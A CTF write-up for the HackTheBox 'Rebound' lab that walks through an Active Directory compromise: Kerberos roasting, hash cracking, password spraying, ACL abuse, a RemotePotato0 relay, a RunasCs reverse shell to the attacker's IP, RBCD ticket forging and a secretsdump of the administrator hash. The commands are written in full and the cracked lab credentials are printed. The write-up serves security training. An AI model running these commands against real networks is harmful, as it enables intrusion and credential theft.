---
date: 2025-04-22
categories: [CTF, HTB]
title: "HTB - Rebound"
tags: ['bloodhound', 'hashcat', 'impacket', 'kerberos', 'ldap', 'linux', 'nmap', 'privilege escalation', 'python', 'rce', 'secretsdump', 'smb']

description: "Rebound - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# HTB - Rebound

NMAP

![image1](../resources/5d95f5c33e4642bdbbefed6254d7623d.png)

Add rebound.htb to /etc/hosts

```bash
enum4linux -u "guest" -a rebound.htb

```

![image2](../resources/6b49abc253c84dbf96a39697a0d89af8.png)

Connect to /Shared - but it's empty:


![image3](../resources/3e4f8c2522734356bf820fbf5874a32c.png)

- Enumerate domain users with kerbrute and CME:
```bash
./kerbrute userenum --dc 10.129.229.114 -d rebound.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

```

![image4](../resources/50c73c6fa62341219dc6f12e7fb57739.png)

```bash
crackmapexec smb rebound.htb -u "guest" -p "" --rid-brute 10000

```

![image5](../resources/11c60d96bdfd4fe8bcacf23580d3d3a0.png)

```bash
cat valid_users.txt | cut -d "\\" -f 2 | cut -d "(" -f 1 > valid_users

```
- jjones - Require PreAuth not set:
```bash
impacket-GetNPUsers rebound.htb/ -users valid_users -no-pass -dc-ip rebound.htb

```

![image6](../resources/81eb6a989a6b45bb99010355c1eddbad.png)

```bash
hashcat -m 18200 --force -a 0 hash.txt /usr/share/wordlists/rockyou.txt

```

![image7](../resources/a3785fab389e48cb85c9aecf00d01c7d.png)

If you get this error:


![image8](../resources/96e9deebba1649e6afbbd27beab50c35.png)

```bash
sudo ntpdate -u rebound.htb && sudo hwclock --systohc

```

![image9](../resources/bc972b56f4b642dfbcbc5cd4821b0f15.png)

OR use:

```bash
sudo faketime -f +7h <command>

sudo faketime -f +7h impacket-GetUserSPNs -target-domain rebound.htb -usersfilevalid_users -dc-ip rebound.htb rebound.htb/guest -no-pass

```
- Get Service hashes:
```bash
impacket-GetUserSPNs -target-domain rebound.htb -usersfilevalid_users -dc-ip rebound.htb rebound.htb/guest -no-pass

```

![image10](../resources/bf747789a28148bfbf61b63703c1e91f.png)

- Got hashes for:

\$krb5tgs\$18\$krbtgt\$REBOUND.HTB\$\***krbtgt**\*

\$krb5tgs\$18\$DC01\$\$REBOUND.HTB\$\***DC01\$**\*

\$krb5tgs\$23\$\*ldap_monitor\$REBOUND.HTB\$**ldap_monitor**\*

\$krb5tgs\$18\$delegator\$\$REBOUND.HTB\$\***delegator\$**\*

- For **\$krb5tgs\$18\$**:
```bash
hashcat -m 19700 -a 0 hash_file18 /usr/share/wordlists/rockyou.txt

```
- For **\$krb5tgs\$23\$**:
```bash
hashcat -m 13100 -a 0 hash_file23 /usr/share/wordlists/rockyou.txt

```

![image11](../resources/ef6c5b8250954455a0aaaa744000a6dc.png)

- Got credentials:
**ldap_monitor : 1GR8t@\$\$4u**


![image12](../resources/4a7d04c639344df1868e0885f96a06e3.png)

- Password Spray:
```bash
./kerbrute passwordspray valid_users '1GR8t@\$\$4u' --dc rebound.htb -d rebound.htb

```

![image13](../resources/0f005123f35045ff982895f46ab59a4a.png)

**\*Make sure the username file doesn't have spaces after each name:**


![image14](../resources/3d7b2e9121294440bf080bbb2d36c69f.png)

- Got credentials from password spraying:
**oorend : 1GR8t@\$\$4u**

<https://github.com/CravateRouge/bloodyAD>

<https://github.com/CravateRouge/bloodyAD/wiki/User-Guide>

- We have a group called ServiceMgmt and we have a service account that can use winrm to remotely connect:

![image15](../resources/7d954826b9ed4f6fb30047b327e8ee4b.png)


![image16](../resources/cbd40e7f8c1c4ae8a7f6062a9eecfcb6.png)

- Using bloodyAD to see the groups ACL's:
```bash
python bloodyAD.py -u oorend -d rebound.htb -p '1GR8t@\$\$4u' --host rebound.htb get object ServiceMgmt --resolve-sd

```

![image17](../resources/d9476af89c4f4f088d18c46609a0fbe5.png)

nTSecurityDescriptor.ACL.2.Type: == ALLOWED ==

nTSecurityDescriptor.ACL.2.Trustee: oorend

nTSecurityDescriptor.ACL.2.Right: WRITE_VALIDATED

nTSecurityDescriptor.ACL.2.ObjectType: Self

"WRITE_VALIDATED to Self" here, means oorend can make changes concerning themselves in relation to the ServiceMgmt group - possibly adding themselves to the group.

- We can try and add ourselves to the ServiceMgmt group:
```bash
python bloodyAD.py -u oorend -p '1GR8t@\$\$4u' -d rebound.htb --host rebound.htb add groupMember SERVICEMGMT oorend

```

![image18](../resources/d095f801cda8460280dd43d7057e6b00.png)

OR

```bash
python bloodyAD.py -d rebound.htb -u oorend -p '1GR8t@\$\$4u' --host rebound.htb add groupMember 'CN=SERVICEMGMT,CN=USERS,DC=REBOUND,DC=HTB' "CN=oorend,CN=Users,DC=rebound,DC=htb"

```
- We can check with:

![image19](../resources/e5521f3b63c14dcf86f439c312916e92.png)

- Now that we are in the group - we can look into winrm_svc:
```bash
python bloodyAD.py -u oorend -d rebound.htb -p '1GR8t@\$\$4u' --host rebound.htb get object winrm_svc

```

![image20](../resources/ceebda03a10d4df9a4b432f32cbd40ed.png)

Winrm_svc is part of the OU=Service Users

- Since we are now part of the ServiceMgmt group - we can change the permissions for the Service Users OU
```bash
python bloodyAD.py -d rebound.htb -u oorend -p '1GR8t@\$\$4u' --host rebound.htb add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' oorend

```

![image21](../resources/146184331ee0432ca9a2c6be69beb85b.png)

- We now have FULL CONTROL over the OU and the objects inside the OU, ie. winrm_svc. So we can change winrm_svc password:
```bash
python bloodyAD.py -d rebound.htb -u oorend -p '1GR8t@\$\$4u' --host rebound.htb set password winrm_svc 'Password1!'

```

![image22](../resources/9429e7cc52f04577bd3bbc29a8391289.png)

- We can now log in using evil-winrm:
```bash
evil-winrm -i rebound.htb -u winrm_svc -p Password1!

```

![image23](../resources/7e47edaf973f4c419f3d7dd7026070dc.png)

(These steps need to be done in quick succession, otherwise the user gets removed from ServiceMgmt group)

```bash
cat user.txt

```
- Upload Sharphound (new)
```bash
.\SharpHound.exe -c all

.\SharpHound.exe -c DCOnly

```
- Run the new BloodHound and import

- Using a custom query - To find users who have logged in very recently (and might still be active)
<https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/>


![image24](../resources/451cc7eec5b24900b3ff9753e396d2ce.png)


![image25](../resources/92b4879d227a43f7b1306bff6d04bd03.png)

We find Tbrady and Administrator - and they just logged on/ might still be logged in

**<u>RemotePotato0</u>**

- We can leverage an exploit called **RemotePotato** to steal the hash of a logged in user
<https://github.com/antonioCoco/RemotePotato0>


![image26](../resources/0a1348e28848418e8201cf7d1282d9b8.png)

- On Kali - Set up:
```bash
sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.129.169.100:9999 &&

sudo python3 impacket-ntlmrelayx -t ldap://10.129.169.100 --no-wcf-server --escalate-user winrm_svc

```

![image27](../resources/9e96bd7f67744b27ac29f66caf716d22.png)

- On the victim:
```bash
./RemotePotato0.exe -m 2 -r 10.10.14.23 -x 10.10.14.23 -p 9999

```

![image28](../resources/b3cce8c44b784e08aff2f470c4517e79.png)

- Crack with hashcat:
```bash
hashcat -m 5600 hash_brady /usr/share/wordlists/rockyou.txt

```

![image29](../resources/1d6f68d67935478e9df0926537cacdcf.png)

- Upload RunasCs.exe and run:
```bash
.\RunasCs.exe tbrady 543BOMBOMBUNmanda cmd.exe -r 10.10.14.23:8888

```

![image30](../resources/321cdecdddcd4d06941d5c4003fa9dec.png)

- Set up listener:

![image31](../resources/539641d6d029425180003a52f25ee54b.png)

- Checking for Constrained Delegation vulnerabilities:

Upload PowerView.ps1

```powershell
. ./PowerView.ps1

Get-DomainComputer -TrustedToAuth

```

![image32](../resources/c6b1d64c548f4d2aba4583e7cb5d766a.png)

- **The delegator GMSA has constrained delegation configured over the DC**


![image33](../resources/f3f294866b9d4655a3e32662789c1574.png)

- Query delegator\$ to see its ACL's:
```bash
./bloodyAD.py -d rebound.htb -u tbrady -p '543BOMBOMBUNmanda' --host dc01.rebound.htb get object 'delegator\$' --resolve-sd

```

![image34](../resources/fb2925f8387240afa78f7821e9359041.png)

We can see that tbrady has GENERIC_ALL on this account

- **Get the GMSA password:**
```bash
./bloodyAD.py -d rebound.htb -u tbrady -p '543BOMBOMBUNmanda' --host dc01.rebound.htb get object 'delegator\$' --resolve-sd --attr msDS-ManagedPassword

```

![image35](../resources/e96a2eb7ee4448e68efae2d1e16b58be.png)

NTLM hash: **aad3b435b51404eeaad3b435b51404ee:e1630b0e18242439a50e9d8b5f5b7524**

- This is a good article to read for RBCD:
<https://medium.com/r3d-buck3t/how-to-abuse-resource-based-constrained-delegation-to-gain-unauthorized-access-36ac8337dd5a>

```bash
impacket-getTGT 'rebound.htb/delegator\$@dc01.rebound.htb' -hashes aad3b435b51404eeaad3b435b51404ee:e1630b0e18242439a50e9d8b5f5b7524 -dc-ip 10.129.169.100

```

![image36](../resources/9e95a031e64b4797892bcd539b3564f2.png)

```bash
export KRB5CCNAME=delegator\$@dc01.rebound.htb.ccache

```

![image37](../resources/e1903b40331c46f1a9756598af164246.png)

- Make sure that /etc/hosts only contains the following:

![image38](../resources/b2263e411a8b41e5bf18575d235bdbea.png)


Comment out rebound.htb if you have it

And add **dc01.rebound.htb** and **dc01**


(any localhost stuff is obviously fine)

If you don't have it like this you WILL get the error:

**\[-\] invalid server address**

- In order for RBCD to work it needs the **msDS-AllowedToActOnBehalfOfOtherIdentity** property
Impacket-rbcd is a python script for handling the msDS-AllowedToActOnBehalfOfOtherIdentity property of a target computer

```bash
impacket-rbcd 'rebound.htb/delegator\$' -k -no-pass -delegate-from ldap_monitor -delegate-to 'delegator\$' -action write -use-ldaps -dc-ip 10.129.169.100 -debug

```

![image39](../resources/1537399acd0d4a1195802c1e3749ed04.png)

- Unset the env variable:
```bash
unset KRB5CCNAME
```

- Once the attribute has been modified, getST can then perform all the necessary steps to obtain the final "impersonating" Service Ticket:

From BloodHound, we can see the SPN to use for delegate\$


![image40](../resources/923a5f654e1d41aebf9a06989ac85c79.png)


![image41](../resources/159611edee42464b814bf0ebab0810e8.png)


![image42](../resources/ceb194de813248bdabed9d6154d5cbc1.png)

```bash
impacket-getST -spn "browser/dc01.rebound.htb" -impersonate "dc01$" 'rebound.htb/ldap_monitor:1GR8t@\$\$4u' -dc-ip 10.129.169.100

```

![image43](../resources/8002587590a6416c99adb493a5f38bb0.png)

```bash
export KRB5CCNAME=dc01\\.ccache

```

![image44](../resources/07b18dc31b1a4990b59a54bf841ca6a6.png)

```bash
impacket-getST -spn "http/dc01.rebound.htb" -impersonate "dc01$" -additional-ticket "dc01$.ccache" "rebound.htb/delegator$" -hashes aad3b435b51404eeaad3b435b51404ee:e1630b0e18242439a50e9d8b5f5b7524 -k -no-pass -dc-ip 10.129.34.86

```

![image45](../resources/6d9dce5efb9b439e9b0025b5bafbf807.png)

```bash
impacket-secretsdump -no -k dc01.rebound.htb -just-dc-user administrator -dc-ip 10.129.34.86

```

![image46](../resources/529ce7a8eadb40618b1aff7a779298ad.png)

```bash
impacket-wmiexec -hashes :176be138594933bb67db3b2572fc91b8 rebound.htb/administrator@dc01.rebound.htb

```

![image47](../resources/91a49e794f5644629b3c64cb32a8a948.png)


![image48](../resources/887d5b8811a54d07a2417539c22bfc8b.png)